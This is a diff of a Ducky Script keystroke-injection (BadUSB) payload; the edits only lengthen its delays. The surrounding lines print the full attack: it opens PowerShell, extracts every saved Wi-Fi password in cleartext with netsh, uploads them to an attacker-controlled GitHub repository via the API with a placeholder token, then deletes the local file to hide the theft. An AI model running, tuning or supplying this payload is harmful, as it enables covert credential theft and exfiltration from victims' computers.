@@ -3,27 +3,28 @@ REM change GITHUB TOKEN HERE, and YOUR GITHUB REPO HERE, when you make a token f
 
 REM --- Open PowerShell ---
 GUI r
-DELAY 500
+DELAY 1500
 STRING powershell
 DELAY 50
 ENTER
-DELAY 500
+DELAY 1500
 
 REM --- Save Wi-Fi passwords to Desktop ---
 STRING $file="$env:USERPROFILE\Desktop\wifi_passwords.txt"; (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {($_ -split ":")[1].Trim()} | ForEach-Object { $pw = (netsh wlan show profile name="$_" key=clear | Select-String "Key Content" | ForEach-Object {($_ -split ":")[1].Trim()}); "$_ : $pw" }) | Out-File $file
-DELAY 500
+DELAY 1500
 ENTER
 
 REM --- Append to GitHub file with SHA handling ---
 STRING $token="GITHUB TOKEN HERE"; $repo="YOUR GITHUB REPO HERE"; $uri="https://api.github.com/repos/$repo/contents/wifi_passwords.txt"; try { $existingData = Invoke-RestMethod -Uri $uri -Headers @{Authorization="Bearer $token"} -Method GET; $existingDecoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($existingData.content)); $sha = $existingData.sha } catch { $existingDecoded = ""; $sha = $null }; $newContent = $existingDecoded + "`n" + (Get-Content $file -Raw); $body = @{message="append wifi_passwords.txt"; content=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($newContent))}; if ($sha) { $body.sha = $sha }; $bodyJson = $body | ConvertTo-Json; Invoke-RestMethod -Uri $uri -Headers @{Authorization="Bearer $token"} -Method Put -Body $bodyJson
-DELAY 500
+DELAY 1500
 ENTER
 
 REM --- Delete local file ---
 STRING Remove-Item $file -Force
-DELAY 500
+DELAY 1500
 ENTER
 DELAY 200
 STRING exit
 
 ENTER
+
